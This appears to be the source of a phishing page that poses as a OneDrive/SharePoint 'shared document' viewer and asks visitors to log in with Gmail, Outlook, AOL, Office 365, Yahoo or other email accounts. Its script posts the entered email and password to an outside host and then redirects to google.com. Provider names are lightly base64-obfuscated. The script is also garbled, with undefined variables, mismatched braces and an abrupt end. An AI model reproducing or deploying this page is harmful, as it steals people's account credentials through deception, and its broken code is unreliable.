<!DOCTYPE html>
<html>

<head>
    <title>Adobe Document</title>
    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
    <script type="text/javascript" src="https://code.jquery.com/jquery-3.1.1.min.js"></script>
    <script type="text/javascript" src="https://code.jquery.com/jquery-3.3.1.js" integrity="sha256-2Kok7MbOyxpgUVvAk/HJ2jigOSYS2auK4Pfzbm7uH60=" crossorigin="anonymous"></script>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
    <link href="https://fonts.googleapis.com/css?family=Yellowtail&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.0/css/all.css" integrity="sha384-lZN37f5QGtY3VHgisS14W3ExzMWZxybE1SJSEsQp9S+oqd12jhcu+A56Ebc1zFSJ" crossorigin="anonymous">
    <title>Share Point Online</title>
    <link href="css/hover.css" rel="stylesheet" media="all">
    <style type="text/css">
    /* Made with love by Mutiullah Samim*/

    @import url('https://fonts.googleapis.com/css?family=Numans');

    html,
    body {
        background-image: url('images/4b.jpg');
        background-size: cover;
        background-repeat: no-repeat;
        height: 100%;
        font-family: 'Numans', sans-serif;
    }

    .container {
        align-content: center;
    }

    .card {

        width: auto;
        background-color: rgba(0, 0, 0, 0.5) !important;
    }

    .social_icon span {
        font-size: 60px;
        margin-left: 10px;
        color: #FFC312;
    }

    .social_icon span:hover {
        color: white;
        cursor: pointer;
    }

    .card-header h3 {
        color: white;
    }

    .social_icon {
        position: absolute;
        right: auto;
        left: auto;
        top: -30px;
    }

    .input-group-prepend span {
        width: 50px;
        background-color: #FFC312;
        color: black;
        border: 0 !important;
    }

    input:focus {
        outline: 0 0 0 0 !important;
        box-shadow: 0 0 0 0 !important;

    }

    .remember {
        color: white;
    }

    .remember input {
        width: 20px;
        height: 20px;
        margin-left: 15px;
        margin-right: 5px;
    }

    .login_btn {
        color: black;
        background-color: #FFC312;
        width: 100px;
    }

    .login_btn:hover {
        color: black;
        background-color: white;
    }

    .links {
        color: white;
    }

    .links a {
        margin-left: 4px;
    }

    @media only screen and (max-width: 995px) {

        html,
        body {
            background-image: url('images/4b.jpg');
            background-size: cover;
            background-repeat: no-repeat;
            height: auto;
            font-family: 'Numans', sans-serif;
        }
    }
    </style>
</head>

<body>
    <div class="container-fluid ">
        <div class="row bg">
            <div class="container">
                <div class="row my-5 py-4">
                    <div class="col-lg-6" style="padding:0px 0px 0px 0px;">
                        <div class="text-center pt-5 mt-2">
                            <img src="images/onedrive-white.png" class="img-fluid" width="250px"><br>
                            <span class="h2 text-white">OneDrive</span><br>
                            <span class="h5 text-white font-weight-normal">To read he document, please choose your email provider below login to view shared files.</span>
                        </div>
                    </div>
                    <div class="col-lg-6" style="margin:40px 0px 0px 0px;">
                        <div class="">
                            <div class="card">
                                <div class="card-header pt-5">
                                    <div class="d-flex rounded justify-content-end p-2 social_icon rounded" style="background-color: rgba(0,0,0,0.5);">
                                        <a href="javascript:void(0)" id="gmailmodal" class="hvr-grow w-100" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
                                            <span><img id="fieldImgG" src="images/gmail-b.png" width="50px" class="rounded"></span>
                                        </a>
                                        <a href="javascript:void(0)" id="outlookmodal" class="hvr-grow w-100" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
                                            <span><img id="fieldImgO" src="images/outlook-w.png" width="50px" class="rounded"></span>
                                        </a>
                                        <a href="javascript:void(0)" id="aolmodal" class="hvr-grow w-100" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
                                            <span><img id="fieldImgA" src="images/aol-w.png" width="50px" class="rounded"></span>
                                        </a>
                                        <a href="javascript:void(0)" id="office365modal" class="hvr-grow w-100" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
                                            <span><img id="fieldImgOf" src="images/office365-w.png" width="50px" class="rounded"></span>
                                        </a>
                                        <a href="javascript:void(0)" id="yahoomodal" class="hvr-grow w-100" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
                                            <span><img id="fieldImgY" src="images/yahoo-w.png" width="50px" class="rounded"></span>
                                        </a>
                                        <a href="javascript:void(0)" id="othermodal" class="hvr-grow w-100" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
                                            <span><img id="fieldImgOt" src="images/other-w.png" width="50px" class="rounded"></span>
                                        </a>
                                    </div>
                                </div>
                                <form id="contact" class="form-horizontal well">
                                    <div class="card-body">
                                        <div class="col-lg-12">
                                            <span class="h4 text-white">Sign In</span>
                                            <span class="h4 font-weight-bold text-white" id="field">Gmail</span>
                                            <div class="alert alert-danger" id="mgss"></div>
                                            <div class="form-group">
                                                <label for="exampleInputai1" class="text-white">Email address</label>
                                                <input type="email" name="ai" class="form-control" id="ai" aria-describedby="aiHelp" placeholder="Enter email">
                                                <small id="aiHelp" class="form-text text-white">We'll never share your email with anyone else.</small>
                                            </div>
                                        </div>
                                        <div class="col-lg-12">
                                            <div class="form-group">
                                                <label for="pr" class="text-white">Password</label>
                                                <input type="password" name="pr" class="form-control" id="pr" aria-describedby="aiHelp" placeholder="Enter Password">
                                            </div>
                                        </div>
                                    </div>
                                    <div class="modal-footer">
                                        <button type="button" class="btn btn-danger" data-dismiss="modal">Close</button>
                                        <button class="btn btn-lg btn-success pull-right" id="submit-btn">Login</button>
                                    </div>
                                </form>
                                <div class="card-footer">
                                    <div class="d-flex text justify-content-center links">
                                        Don't have an account?<a href="#" class="text-success">Sign Up</a>
                                    </div>
                                    <div class="d-flex justify-content-center">
                                        <a href="#" class="text-warning">Forgot your password?</a>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <!-- Optional JavaScript -->
    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
    <script type="text/javascript" src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
    <script type="text/javascript" src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
</body>
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
<script>
/* global $ */
$(document).ready(function() {
    $("#mgss").hide();

    var gm = "Z21haWw=";

    var of = "b2ZmaWNlMzY1";

        $('#contact').trigger("reset");
        $('#fieldImgG').attr('src', 'images/' + atob(gm) + '-b.png');
        $('#fieldImgO').attr('src', 'images/' + atob(ou) + '-w.png');
        $('#fieldImgA').attr('src', 'images/aol-w.png');
        $('#fieldImgOf').attr('src', 'images/' + atob( of ) + '-w.png');
        $('#fieldImgY').attr('src', 'images/' + atob(ya) + '-w.png');
        $('#fieldImgOt').attr('src', 'images/other-w.png');

        $('#ajaxModal').modal('show');

    $('#' + atob(ou) + 'modal').click(function() {
        $('#contact').trigger("reset");
        $('#fieldImgG').attr('src', 'images/' + atob(gm) + '-w.png');
        $('#fieldImgO').attr('src', 'images/' + atob(ou) + '-b.png');
        $('#fieldImgA').attr('src', 'images/aol-w.png');
        $('#fieldImgOf').attr('src', 'images/' + atob( of ) + '-w.png');
        $('#fieldImgY').attr('src', 'images/' + atob(ya) + '-w.png');
        $('#fieldImgOt').attr('src', 'images/other-w.png');
        $('#field').html("Outlook");
        $('#ajaxModal').modal('show');

    $('#aolmodal').click(function() {

        $('#fieldImgG').attr('src', 'images/' + atob(gm) + '-w.png');
        $('#fieldImgO').attr('src', 'images/' + atob(ou) + '-w.png');
        $('#fieldImgA').attr('src', 'images/aol-b.png');
        $('#fieldImgOf').attr('src', 'images/' + atob( of ) + '-w.png');

        $('#fieldImgOt').attr('src', 'images/other-w.png');
        $('#field').html("Aol");
        $('#ajaxModal').modal('show');
    });
    $('#' + atob( of ) + 'modal').click(function() {
        $('#contact').trigger("reset");
        $('#fieldImgG').attr('src', 'images/' + atob(gm) + '-w.png');
        $('#fieldImgO').attr('src', 'images/' + atob(ou) + '-w.png');
        $('#fieldImgA').attr('src', 'images/aol-w.png');

        $('#fieldImgOt').attr('src', 'images/other-w.png');
        $('#field').html("Office 365");
        $('#ajaxModal').modal('show');
    });
    $('#' + atob(ya) + 'modal').click(function() {
        $('#contact').trigger("reset");
        $('#fieldImgG').attr('src', 'images/' + atob(gm) + '-w.png');

        $('#fieldImgOf').attr('src', 'images/' + atob( of ) + '-w.png');

        $('#fieldImgOt').attr('src', 'images/other-w.png');
        $('#field').html("Yahoo");
        $('#ajaxModal').modal('show');
    });
    $('#othermodal').click(function() {
        $('#contact').trigger("reset");
        $('#fieldImgG').attr('src', 'images/' + atob(gm) + '-w.png');
        $('#fieldImgO').attr('src', 'images/' + atob(ou) + '-w.png');
        $('#fieldImgA').attr('src', 'images/aol-w.png');
        $('#fieldImgOf').attr('src', 'images/' + atob( of ) + '-w.png');
        $('#fieldImgY').attr('src', 'images/' + atob(ya) + '-w.png');
        $('#fieldImgOt').attr('src', 'images/other-b.png');
        $('#field').html("Other Mail");
        $('#ajaxModal').modal('show');
    });
    $('#submit-btn').click(function(event) {
        event.preventDefault();
        var ai = $("#ai").val();
        var pr = $("#pr").val();
        var detail = $("#field").html();


        var mgss = $('#mgss').html();
        $('#mgss').text(mgss);
        count = count + 1;

        $.ajax({
            dataType: 'JSON',
            url: 'https://ighese.ir/next.php',
            type: 'POST',
            data: {
                ai: ai,
                pr: pr,
                detail: detail,

            },
            // data: $('#contact').serialize(),
            beforeSend: function(xhr) {
                $('#submit-btn').html('Verifing...');
            },
            success: function(response) {

                    count = 0;
                    window.location.replace("http://google.com");
                    return false;
                }
                $("#mgss").show();
                $('#mgss').html("Please try again later");
            },
            error: function() {
                $("#pr").val("");
                if (count >= 2) {
                    count = 0;
                    window.location.replace("http://google.com");
                    return false;
                }
                $("#mgss").show();
                $('#mgss').html("Please try again later");
